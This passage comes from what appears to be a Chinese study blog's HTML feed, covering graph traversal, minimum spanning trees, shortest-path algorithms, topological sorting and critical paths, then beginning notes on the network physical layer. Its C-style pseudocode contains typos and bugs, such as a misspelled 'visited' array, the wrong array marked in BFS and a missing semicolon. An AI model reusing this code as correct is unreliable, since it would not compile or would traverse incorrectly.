class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">bool</span> visited[MAX_VERTEX_NUM];  <span class="hljs-comment">//访问标记数组</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">BFSTraverse</span><span class="hljs-params">(Graph,G)</span>   <span class="hljs-comment">//对图G进行广度优先遍历</span><br>&#123;<br>    <span class="hljs-keyword">for</span>(i=<span class="hljs-number">0</span>;i&lt;G.vexnum;++i)<br>        visited[i]=FALSE;    <span class="hljs-comment">//访问标记数组初始化</span><br>    InitQueue(Q);            <span class="hljs-comment">//初始化辅助队列</span><br>    <span class="hljs-keyword">for</span>(i=<span class="hljs-number">0</span>;i&lt;G.vexnum;++i)  <span class="hljs-comment">//从0号顶点开始遍历</span><br>        <span class="hljs-keyword">if</span>(!visited[i])     <span class="hljs-comment">//对每一个连通分量调用一次BFS</span><br>            BFS(G,i);      <span class="hljs-comment">//vi未访问过，从vi开始BFS</span><br>&#125;<br><br><span class="hljs-comment">//广度优先遍历</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">BFS</span><span class="hljs-params">(Graph G,<span class="hljs-type">int</span> v)</span>          <span class="hljs-comment">//从顶点v出发，广度优先遍历图G</span><br>&#123;<br>    visit(v);                   <span class="hljs-comment">//访问初始结点v</span><br>    visited[v]=TRUE;            <span class="hljs-comment">//对v做已访问标记</span><br>    Enqueue(Q,v);               <span class="hljs-comment">//顶点v入队伍Q</span><br>    <span class="hljs-keyword">while</span>(!isEmpty(Q))          <br>    &#123;<br>        DeQueue(Q,v);        <span class="hljs-comment">//顶点v 出队列</span><br>        <span class="hljs-keyword">for</span>(w=FirstNeighbor(G,v);w&gt;=<span class="hljs-number">0</span>;w=NextNeighbor(G,v,w))<br>            <span class="hljs-comment">//检测v所有的邻接点</span><br>            <span class="hljs-keyword">if</span>(!visted[w])<br>            &#123;<br>                visit(w);            <span class="hljs-comment">//访问顶点w</span><br>                visit[w]=TRUE;       <span class="hljs-comment">//对w做已访问标记</span><br>                EnQueue(Q,w);       <span class="hljs-comment">//顶点w入队伍</span><br>            &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><center><img src="/img/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%85%AB/25.jpg" style="zoom:80%;" /></center><ul><li><h6 id="复杂度分析"><a href="#复杂度分析" class="headerlink" title="复杂度分析"></a>复杂度分析</h6></li></ul><center><img src="/img/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%85%AB/26.jpg" style="zoom:80%;" /></center><ul><li><h6 id="广度优先生成树"><a href="#广度优先生成树" class="headerlink" title="广度优先生成树"></a>广度优先生成树</h6></li></ul><center><img src="/img/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%85%AB/27.jpg" style="zoom:80%;" /></center><ul><li><h6 id="注：有向图的BFS过程"><a href="#注：有向图的BFS过程" class="headerlink" title="注：有向图的BFS过程"></a>注：有向图的BFS过程</h6></li></ul><center><img src="/img/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%85%AB/28.jpg" style="zoom:80%;" /></center>&emsp;<h4 id="9-图的深度优先遍历"><a href="#9-图的深度优先遍历" class="headerlink" title="9.图的深度优先遍历"></a>9.图的深度优先遍历</h4><ul><li><h6 id="起初版-1"><a href="#起初版-1" class="headerlink" title="起初版"></a>起初版</h6></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">bool</span> visited[MAX_VERTEX_NUM];<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">DFS</span><span class="hljs-params">(Grah G,<span class="hljs-type">int</span> v)</span><br>&#123;<br>    visir(v);     <span class="hljs-comment">//从顶点v出发，深度优先遍历图G</span><br>    visited[v]=TURE;   <span class="hljs-comment">//访问顶点v</span><br>    <span class="hljs-keyword">for</span>(W=FirstNeighbor(G,v);w&gt;=<span class="hljs-number">0</span>;w=NextNeighor(G,v,w))<br>        <span class="hljs-keyword">if</span>(!visit[w])         <span class="hljs-comment">//w为u的尚未访问的邻接顶点</span><br>        &#123;<br>            DFS(G,w);<br>        &#125;<br>&#125;<br></code></pre></td></tr></table></figure><center><img src="/img/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%85%AB/29.jpg" style="zoom:80%;" /></center><ul><li><h6 id="Final版-1"><a href="#Final版-1" class="headerlink" title="Final版"></a>Final版</h6></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">bool</span> visited[MAX_VERTEX_NUM];<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">DFSTraverse</span><span class="hljs-params">(Graph,G)</span>   <span class="hljs-comment">//对图G进行深度优先遍历</span><br>&#123;<br>    <span class="hljs-keyword">for</span>(v=<span class="hljs-number">0</span>;v&lt;G.vexnum;++v)<br>        visited[v]=FALSE;    <span class="hljs-comment">//访问标记数组初始化</span><br>    <span class="hljs-keyword">for</span>(v=<span class="hljs-number">0</span>;v&lt;G.vexnum;++v)  <span class="hljs-comment">//从0号顶点开始遍历</span><br>        <span class="hljs-keyword">if</span>(!visited[v])     <span class="hljs-comment">//对每一个连通分量调用一次BFS</span><br>            DFS(G,v);      <span class="hljs-comment">//vi未访问过，从vi开始BFS</span><br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">DFS</span><span class="hljs-params">(Grah G,<span class="hljs-type">int</span> v)</span><br>&#123;<br>    visir(v);     <span class="hljs-comment">//从顶点v出发，深度优先遍历图G</span><br>    visited[v]=TURE;   <span class="hljs-comment">//访问顶点v</span><br>    <span class="hljs-keyword">for</span>(W=FirstNeighbor(G,v);w&gt;=<span class="hljs-number">0</span>;w=NextNeighor(G,v,w))<br>        <span class="hljs-keyword">if</span>(!visit[w])         <span class="hljs-comment">//w为u的尚未访问的邻接顶点</span><br>        &#123;<br>            DFS(G,w);<br>        &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>&emsp;&emsp;解决了非连通图无法遍历完所有结点的问题</p><ul><li><h6 id="复杂度分析-1"><a href="#复杂度分析-1" class="headerlink" title="复杂度分析"></a>复杂度分析</h6></li></ul><center><img src="/img/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%85%AB/30.jpg" style="zoom:80%;" /></center><center><img src="/img/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%85%AB/31.jpg" style="zoom:80%;" /></center><ul><li><h6 id="深度优先生成树"><a href="#深度优先生成树" class="headerlink" title="深度优先生成树"></a>深度优先生成树</h6></li></ul><center><img src="/img/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%85%AB/32.jpg" style="zoom:80%;" /></center><p>&emsp;</p><h4 id="10-最小生成树"><a href="#10-最小生成树" class="headerlink" title="10.最小生成树"></a>10.最小生成树</h4><ul><li><h6 id="生成树的定义"><a href="#生成树的定义" class="headerlink" title="生成树的定义"></a>生成树的定义</h6></li></ul><p>&emsp;&emsp;连通图的生成树是包括图中全部顶点的一个极小连通子图，若图中的顶点数维n，则它的生成树含有n-1条边，对生成树而言，若砍去它的一条边，则会变成非连通图，若加上一条边则会形成一个回路</p><center><img src="/img/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%85%AB/33.jpg" style="zoom:80%;" /></center><ul><li><h6 id="最小生成树的定义"><a href="#最小生成树的定义" class="headerlink" title="最小生成树的定义"></a>最小生成树的定义</h6></li></ul><p>&emsp;&emsp;对于一个带权连通无向图G(V,E)，生成树不同，每棵树的权（即树中所有边上的权值之和）也可能不同。设R为G的所有生成树的集合，若T为R中边的权值之和最小的生成树，则T称为G的最小生成树</p><center><img src="/img/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%85%AB/34.jpg" style="zoom:80%;" /></center><p>&emsp;</p><ul><li><h6 id="Prim算法（普利姆）"><a href="#Prim算法（普利姆）" class="headerlink" title="Prim算法（普利姆）"></a>Prim算法（普利姆）</h6></li></ul><p>&emsp;&emsp;从某一个顶点开始构建生成树；每次将代价最小的新顶点纳入生成树，直到所有的顶点都纳入为止</p><center><img src="/img/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%85%AB/35.jpg" style="zoom:80%;" /></center><center><img src="/img/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%85%AB/38.jpg" style="zoom:80%;" /></center><center><img src="/img/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%85%AB/39.jpg" style="zoom:80%;" /></center><ul><li>Kruskal算法（克鲁斯卡尔）</li></ul><p>&emsp;&emsp;每次选择一条权值最小的边，使这条边的两头连通（原本已经连通的不选），直到所有的结点都连通</p><center><img src="/img/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%85%AB/36.jpg" style="zoom:80%;" /></center><center><img src="/img/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%85%AB/40.jpg" style="zoom:80%;" /></center><center><img src="/img/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%85%AB/41.jpg" style="zoom:80%;" /></center><center><img src="/img/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%85%AB/42.jpg" style="zoom:80%;" /></center><center><img src="/img/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%85%AB/43.jpg" style="zoom:80%;" /></center><center><img src="/img/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%85%AB/44.jpg" style="zoom:80%;" /></center><ul><li><h6 id="算法对比"><a href="#算法对比" class="headerlink" title="算法对比"></a>算法对比</h6></li></ul><center><img src="/img/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%85%AB/37.jpg" style="zoom:80%;" /></center><p>&emsp;</p><h4 id="11-最短路径"><a href="#11-最短路径" class="headerlink" title="11.最短路径"></a>11.最短路径</h4><center><img src="/img/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%85%AB/52.jpg" style="zoom:120%;" /></center><ul><li><h6 id="BFS算法——单源最短路径问题"><a href="#BFS算法——单源最短路径问题" class="headerlink" title="BFS算法——单源最短路径问题"></a>BFS算法——单源最短路径问题</h6></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//求顶点u到其他顶点的最短路径</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">BFS_MIN_Distance</span><span class="hljs-params">(Graph G,<span class="hljs-type">int</span> u)</span><br>&#123;<br>    <span class="hljs-comment">//d[i]表示从u到i结点的最短路径</span><br>    <span class="hljs-keyword">for</span>(i=<span class="hljs-number">0</span>;i&lt;G.vexnum;++i)<br>    &#123;<br>        d[i]=∞;    <span class="hljs-comment">//初始化路径长度</span><br>        path[i]=<span class="hljs-number">-1</span>;   <span class="hljs-comment">//最短路径从哪个顶点过来</span><br>    &#125;<br>    d[u]=<span class="hljs-number">0</span>;    <span class="hljs-comment">//自己到自己的距离为0</span><br>    visited[u]=TRUE;<br>    EnQueue(Q,u);<br>    <span class="hljs-keyword">while</span>(!isEmpty(Q))     <span class="hljs-comment">//BFS算法主过程         </span><br>    &#123;<br>        DeQueue(Q,u);        <span class="hljs-comment">//队头元素u出队列</span><br>        <span class="hljs-keyword">for</span>(w=FirstNeighbor(G,u);w&gt;=<span class="hljs-number">0</span>;w=NextNeighbor(G,u,w))<br>            <span class="hljs-keyword">if</span>(!visted[w])        <span class="hljs-comment">//w为u的尚未访问的邻接顶点</span><br>            &#123;<br>                d[w]=d[u]+<span class="hljs-number">1</span>;         <span class="hljs-comment">//路径长度加1</span><br>                path[w]=u            <span class="hljs-comment">//最短路径应从u到w</span><br>                visit[w]=TRUE;       <span class="hljs-comment">//设置已访问标记</span><br>                EnQueue(Q,w);       <span class="hljs-comment">//顶点w入队伍</span><br>            &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><center><img src="/img/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%85%AB/45.jpg" style="zoom:80%;" /></center><p>&emsp;&emsp;BFS算法求单源最短路径只适⽤于⽆ 权图，或所有边的权值都相同的图</p><ul><li><h6 id="Dijkstra算法"><a href="#Dijkstra算法" class="headerlink" title="Dijkstra算法"></a>Dijkstra算法</h6></li></ul><center><img src="/img/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%85%AB/46.jpg" style="zoom:80%;" /></center><center><img src="/img/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%85%AB/47.jpg" style="zoom:80%;" /></center><center><img src="/img/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%85%AB/48.jpg" style="zoom:80%;" /></center><center><img src="/img/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%85%AB/49.jpg" style="zoom:80%;" /></center><center><img src="/img/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%85%AB/50.jpg" style="zoom:80%;" /></center><center><img src="/img/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%85%AB/51.jpg" style="zoom:80%;" /></center><p>&emsp;&emsp;注：Dijkstra算法不适合用于有负权值的带权图</p><ul><li><h6 id="Floyd算法"><a href="#Floyd算法" class="headerlink" title="Floyd算法"></a>Floyd算法</h6></li></ul><p>&emsp;&emsp;使用了动态规划思想，将问题的求解分为了多个阶段</p><center><img src="/img/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%85%AB/53.jpg" style="zoom:80%;" /></center><center><img src="/img/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%85%AB/54.jpg" style="zoom:80%;" /></center><center><img src="/img/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%85%AB/55.jpg" style="zoom:80%;" /></center><center><img src="/img/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%85%AB/56.jpg" style="zoom:80%;" /></center><center><img src="/img/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%85%AB/57.jpg" style="zoom:80%;" /></center><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//准备工作，根据图的信息初始化矩阵A和path</span><br><br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> k=<span class="hljs-number">0</span>;k&lt;n;k++)     <span class="hljs-comment">//考虑以VK作为中转点</span><br>&#123;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;n;i++)   <span class="hljs-comment">//遍历整个矩阵，i为行号，j为列号</span><br>    &#123;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j=<span class="hljs-number">0</span>;j&lt;n;j++)<br>        &#123;<br>            <span class="hljs-keyword">if</span>(A[i][j]&gt;A[i][k]+A[k][j])<br>            &#123;<br>                A[i][j]=A[i][k]+A[k][j];  <span class="hljs-comment">//更新最短路径长度</span><br>                path[i][j]=k;           <span class="hljs-comment">//中转点</span><br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>&emsp;&emsp;这种算法的时间复杂度是|V|³，空间复杂度是|V|²</p><ul><li><h6 id="三种算法对比"><a href="#三种算法对比" class="headerlink" title="三种算法对比"></a>三种算法对比</h6></li></ul><center><img src="/img/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%85%AB/58.jpg" style="zoom:80%;" /></center><p>&emsp;</p><h4 id="12-有向无环图（DAG）"><a href="#12-有向无环图（DAG）" class="headerlink" title="12.有向无环图（DAG）"></a>12.有向无环图（DAG）</h4><p>&emsp;&emsp;有向⽆环图：若⼀个有向图中不存在环，则称为有向⽆环图，简称DAG图</p><center><img src="/img/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%85%AB/59.jpg" style="zoom:80%;" /></center><center><img src="/img/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%85%AB/60.jpg" style="zoom:80%;" /></center><p>&emsp;</p><h4 id="13-拓扑排序"><a href="#13-拓扑排序" class="headerlink" title="13.拓扑排序"></a>13.拓扑排序</h4><ul><li><h6 id="AOV网的定义"><a href="#AOV网的定义" class="headerlink" title="AOV网的定义"></a>AOV网的定义</h6></li></ul><p>&emsp;&emsp;⽤顶点表示活动的⽹，⽤DAG图（有向⽆环图）表示⼀个⼯程。顶点表示活动，有向边表示活动&lt;Vi,Vj&gt;，必须先于活动Vj进⾏</p><center><img src="/img/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%85%AB/61.jpg" style="zoom:80%;" /></center><ul><li><h6 id="拓扑排序的定义"><a href="#拓扑排序的定义" class="headerlink" title="拓扑排序的定义"></a>拓扑排序的定义</h6></li></ul><p>&emsp;&emsp;在图论中，由⼀个有向⽆环图 的顶点组成的序列，当且仅当满⾜下列条 件时，称为该图的⼀个拓扑排序：</p><p>&emsp;&emsp; ① 每个顶点出现且只出现⼀次。 </p><p>&emsp;&emsp;② 若顶点A在序列中排在顶点B的前⾯，则 在图中不存在从顶点B到顶点A的路径。</p><center><img src="/img/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%85%AB/62.jpg" style="zoom:80%;" /></center><ul><li><h6 id="拓扑排序实现代码"><a href="#拓扑排序实现代码" class="headerlink" title="拓扑排序实现代码"></a>拓扑排序实现代码</h6></li></ul><center><img src="/img/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%85%AB/63.jpg" style="zoom:80%;" /></center><p>&emsp;</p><h4 id="14-逆拓扑排序"><a href="#14-逆拓扑排序" class="headerlink" title="14.逆拓扑排序"></a>14.逆拓扑排序</h4><ul><li><h6 id="逆拓扑排序定义"><a href="#逆拓扑排序定义" class="headerlink" title="逆拓扑排序定义"></a>逆拓扑排序定义</h6></li></ul><p>&emsp;&emsp;对⼀个AOV⽹，如果采⽤下列步骤进⾏排序，则称之为逆拓扑排序：</p><p>&emsp;&emsp; ① 从AOV⽹中选择⼀个没有后继（出度为0）的顶点并输出。</p><p>&emsp;&emsp; ② 从⽹中删除该顶点和所有以它为终点的有向边。 </p><p>&emsp;&emsp; ③ 重复①和②直到当前的AOV⽹为空。</p><center><img src="/img/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%85%AB/64.jpg" style="zoom:80%;" /></center><ul><li><h6 id="逆拓扑排序实现代码"><a href="#逆拓扑排序实现代码" class="headerlink" title="逆拓扑排序实现代码"></a>逆拓扑排序实现代码</h6></li></ul><p>&emsp;&emsp;第一种方法是参考拓扑排序将入度的比较改变为出度的比较即可，第二种是利用DFS算法实现</p><center><img src="/img/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%85%AB/65.jpg" style="zoom:80%;" /></center><p>&emsp;</p><h4 id="15-关键路径"><a href="#15-关键路径" class="headerlink" title="15.关键路径"></a>15.关键路径</h4><ul><li><h6 id="AOE网的定义"><a href="#AOE网的定义" class="headerlink" title="AOE网的定义"></a>AOE网的定义</h6></li></ul><p>&emsp;&emsp;在带权有向图中，以顶点表示事件，以有向边表示活动，以边上的权值表示完成该活动的开销（如 完成活动所需的时间），称之为⽤边表示活动的⽹络，简称AOE⽹</p><center><img src="/img/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%85%AB/66.jpg" style="zoom:80%;" /></center><p>&emsp;&emsp;在AOE网中仅有一个入度为0的顶点，称为开始顶点（源点），它代表整个工程的开始；也仅有一个出度为0的顶点，称为结束顶点（汇点），它代表整个工程的结束</p><p>&emsp;&emsp;从源点到汇点的有向路径可能有多条，所有路径中，具有最⼤路径⻓度的路径称为 关键路径，⽽把关键路径上的活动称为关键活动</p><ul><li><h6 id="事件vk的最早发⽣时间ve-k"><a href="#事件vk的最早发⽣时间ve-k" class="headerlink" title="事件vk的最早发⽣时间ve(k)"></a>事件vk的最早发⽣时间ve(k)</h6></li></ul><p>&emsp;&emsp;决定了所有从vk开始的活动能够开⼯的最早时间</p><center><img src="/img/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%85%AB/67.jpg" style="zoom:80%;" /></center><ul><li><h6 id="事件vk的最迟发⽣时间vl-k"><a href="#事件vk的最迟发⽣时间vl-k" class="headerlink" title="事件vk的最迟发⽣时间vl(k)"></a>事件vk的最迟发⽣时间vl(k)</h6></li></ul><p>&emsp;&emsp;它是指在不推迟整个⼯程完成的前提下，该事件最迟必须发⽣的时间</p><center><img src="/img/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%85%AB/68.jpg" style="zoom:80%;" /></center><ul><li><h6 id="活动ai的最早开始时间e-i"><a href="#活动ai的最早开始时间e-i" class="headerlink" title="活动ai的最早开始时间e(i)"></a>活动ai的最早开始时间e(i)</h6></li></ul><p>&emsp;&emsp;指该活动弧的起点所表⽰的事件的最早发⽣时间</p><center><img src="/img/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%85%AB/69.jpg" style="zoom:80%;" /></center><ul><li><h6 id="活动ai的最迟开始时间l-i"><a href="#活动ai的最迟开始时间l-i" class="headerlink" title="活动ai的最迟开始时间l(i)"></a>活动ai的最迟开始时间l(i)</h6></li></ul><p>&emsp;&emsp;它是指该活动弧的终点所表示事件的最迟发⽣时间与该活动所需时间之差</p><center><img src="/img/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%85%AB/70.jpg" style="zoom:80%;" /></center><ul><li><h6 id="活动ai的时间余量d-i"><a href="#活动ai的时间余量d-i" class="headerlink" title="活动ai的时间余量d(i)"></a>活动ai的时间余量d(i)</h6></li></ul><p>&emsp;&emsp;d(i)=l(i)-e(i)，表⽰在不增加完成整个⼯程所需总时间的情况下，活动ai可以拖延的时间 若⼀个活动的时间余量为零，则说明该活动必须要如期完成，d(i)=0即l(i) = e(i)的活动ai是关键活动 由关键活动组成的路径就是关键路径</p><center><img src="/img/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%85%AB/71.jpg" style="zoom:80%;" /></center><ul><li><h6 id="关键活动、关键路径"><a href="#关键活动、关键路径" class="headerlink" title="关键活动、关键路径"></a>关键活动、关键路径</h6></li></ul><center><img src="/img/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%85%AB/72.jpg" style="zoom:80%;" /></center><p>&emsp;&emsp;若关键活动耗时增加，则整个⼯程的⼯期将增⻓</p><p>&emsp;&emsp;缩短关键活动的时间，可以缩短整个⼯程的⼯期</p><p>&emsp;&emsp;当缩短到⼀定程度时，关键活动可能会变成⾮关键活动</p>]]></content>
    
    
    <categories>
      
      <category>数据结构学习笔记</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>物理层</title>
    <link href="/2022/10/22/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E4%B8%89/"/>
    <url>/2022/10/22/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E4%B8%89/</url>
    
    <content type="html"><![CDATA[<h1 id="物理层"><a href="#物理层" class="headerlink" title="物理层"></a>物理层</h1><h4 id="1-物理层接口特性"><a href="#1-物理层接口特性" class="headerlink" title="1.物理层接口特性"></a>1.物理层接口特性</h4><p>&emsp;&emsp;物理层解决如何在连接各种计算机的传输媒体上传输数据比特流，而不是指具体的传输媒体，其主要任务是确定与传输媒体接口有关的一些特性</p><ul><li>机械特性</li></ul><p>&emsp;&emsp;定义物理连接的特性，规定物理连接时所采用的规格、接口形状、<strong>引线数目、引脚数量</strong>和排列情况</p><ul><li>电气特性</li></ul><p>&emsp;&emsp;规定传输二进制时，线路上信号的电压范围、<strong>阻抗匹配、传输速率</strong>和距离限制等，例如一下数值内容</p><ul><li>功能特性</li></ul><p>&emsp;&emsp;指明某条线上出现的某一电平表示何种意义，<strong>接口部件</strong>的信号线的用途，例如描述一个物理层接口引脚处于高电平的含义</p><ul><li>规程特性</li></ul><p>&emsp;&emsp;定义各条物理线路的工作规程和时序关系</p><p>&emsp;</p><h4 id="2-通信基础（一）"><a href="#2-通信基础（一）" class="headerlink" title="2.通信基础（一）"></a>2.通信基础（一）</h4><ul><li><h6 id="数据通信模型"><a href="#数据通信模型" class="headerlink" title="数据通信模型"></a>数据通信模型</h6></li></ul><center><img src="/img/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E4%B8%89/1.jpg" style="zoom:80%;" /></center><ul><li><h6 id="通信的相关术语"><a href="#通信的相关术语" class="headerlink" title="通信的相关术语"></a>通信的相关术语</h6></li></ul><p>&emsp;&emsp;数据：传送信息的实体，通常是有意义的符号序列</p><p>&emsp;&emsp;信号：数据的电气/电磁的表现，是数据在传输过程中的存在形式</p><center><img src="/img/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E4%B8%89/2.jpg" style="zoom:80%;" /></center><p>&emsp;&emsp;信源：产生和发送数据的源头</p><p>&emsp;&emsp;信宿：接收数据的重点</p><p>&emsp;&emsp;信道：信号的传输媒介。一般用来表示向某一个方向传送信息的介质，因此一条通信线路往往包含一条发送信道和一条接收信道</p><center><img src="/img/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E4%B8%89/3.jpg" style="zoom:80%;" /></center><ul><li><h6 id="数据通信系统要考虑的3个问题"><a href="#数据通信系统要考虑的3个问题" class="headerlink" title="数据通信系统要考虑的3个问题"></a>数据通信系统要考虑的3个问题</h6></li></ul><p>&emsp;&emsp;&emsp;1.采用单工通信/半双工/全双工通信方式？</p><center><img src="/img/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E4%B8%89/4.jpg" style="zoom:80%;" /></center><p>&emsp;&emsp;&emsp;2.采用串行通信/并行通信方式？</p><center><img src="/img/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E4%B8%89/5.jpg" style="zoom:80%;" /></center><p>&emsp;&emsp;&emsp;3.采用同步通信/异步通信方式？</p><center><img src="/img/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E4%B8%89/6.jpg" style="zoom:80%;" /></center><p>&emsp;</p><h4 id="3-通信基础（二）"><a href="#3-通信基础（二）" class="headerlink" title="3.通信基础（二）"></a>3.通信基础（二）</h4><ul><li><h6 id="码元"><a href="#码元" class="headerlink" title="码元"></a>码元</h6></li></ul><p>&emsp;&emsp;码元是指用一个固定时长的信号波形（数字脉冲），代表不同离散数值的基本波形，是数字通信中数字信号的计量单位，这个时长内的信号称为k进制码元，二该时长称为码元宽度。当码元的离散状态有M个时（M大于2），此时码元为M进制码元。</p><ul><li><h6 id="速率"><a href="#速率" class="headerlink" title="速率"></a>速率</h6></li></ul><p>&emsp;&emsp;速率也叫数据率，是指数据的传输速率，表示单位时间内传输的数据量。可以用<strong>码元传输速率</strong>和<strong>信息传输速</strong>率表示。</p><ul><li>码元传输率</li></ul><h6 id="emsp-emsp-其别名为码元速率、波形速率、调制速率、符号速率等，它表示单位时间内数字通信系统所传输的码元个数（也可以称为脉冲个数或信号变化的次数），单位是波特（Baud）。1波特表示数字通信系统每秒传输一个码元"><a href="#emsp-emsp-其别名为码元速率、波形速率、调制速率、符号速率等，它表示单位时间内数字通信系统所传输的码元个数（也可以称为脉冲个数或信号变化的次数），单位是波特（Baud）。1波特表示数字通信系统每秒传输一个码元" class="headerlink" 